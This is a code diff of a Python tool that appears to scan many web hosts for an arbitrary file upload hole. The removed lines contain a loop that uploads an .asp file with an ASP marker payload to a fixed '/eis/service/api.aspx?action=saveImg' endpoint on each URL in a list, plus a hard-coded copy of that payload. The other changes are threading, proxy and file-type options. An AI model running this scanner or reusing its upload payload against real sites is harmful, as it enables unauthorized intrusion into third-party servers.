@@ -21,27 +21,10 @@ MAX_VARIABLE_NUM = 10
 MAX_LENGTH = 10
 BACK_PATH = list()
 
-# fileObject = {'file': ('RqxyOY9.asp', b'<% response.write("ASuDhtpoO") %>', 'Content-Type: text/html')}
-# attack_url = "/eis/service/api.aspx?action=saveImg"
-# with open('../urls.txt', 'r') as f:
-#     urls = f.read().split()
-#     for url in urls:
-#         _url = url[:-1] if url.endswith("/") else url
-#         print(f"[+] test {_url} ...")
-#         try:
-#             req = requests.post(url + attack_url, headers=headers, files=fileObject, proxies=proxies, timeout=(5, 10))
-#             if req.status_code < 300:
-#                 print(req.status_code, _url)
-#                 print(req.content.decode(req.encoding))
-#                 break
-#         except Exception as e:
-#             print(e.args.__str__())
-#             continue
 
 def _post_request(url: str, file: dict, headers: dict = None) -> (int, requests.Response or str):
     global proxies
     try:
-        file = {'file': ('RqxyOY9.asp', b'<% response.write("ASuDhtpoO") %>', 'Content-Type: text/html')}
         res =requests.post(url, headers=headers, files=file, proxies=proxies)
         return 200, res
     except Exception as e:
@@ -118,7 +101,7 @@ def set_cmd_arg() -> any:
     parser.add_argument('-t', '--thread', type=int,
                         required=False, help='Set the number of program threads (setting range from 1 to 50)')
     parser.add_argument('--proxy', type=str, required=False, help='Set up the proxy')
-    parser.add_argument('--file-type', type=str, required=False, default='.asp', help='Upload file type(default is PHP)')
+    parser.add_argument('--file-type', type=str, required=False, default='asp', help='Upload file type(default is PHP)')
 
     args = parser.parse_args()
     return args
@@ -136,6 +119,7 @@ def parse_cmd_args(args) -> dict:
     if args.content is None and args.upload is None:
         o.setdefault('content', {'type': 'str',
                                  'value': _value})
+
     if args.content is not None:
         if not args.content:
             o.setdefault('content', {'type': 'str',
@@ -185,7 +169,7 @@ def parse_param(o: dict) -> (list, str, str):
     if options:
         options = options[0]
     _proxy = options.get('proxy', None)
-    _type= options.get('file_type', 'asp')
+    _type = options.get('file_type', 'asp')
     if _proxy is None or not _proxy:
         proxies = _proxy
     else:
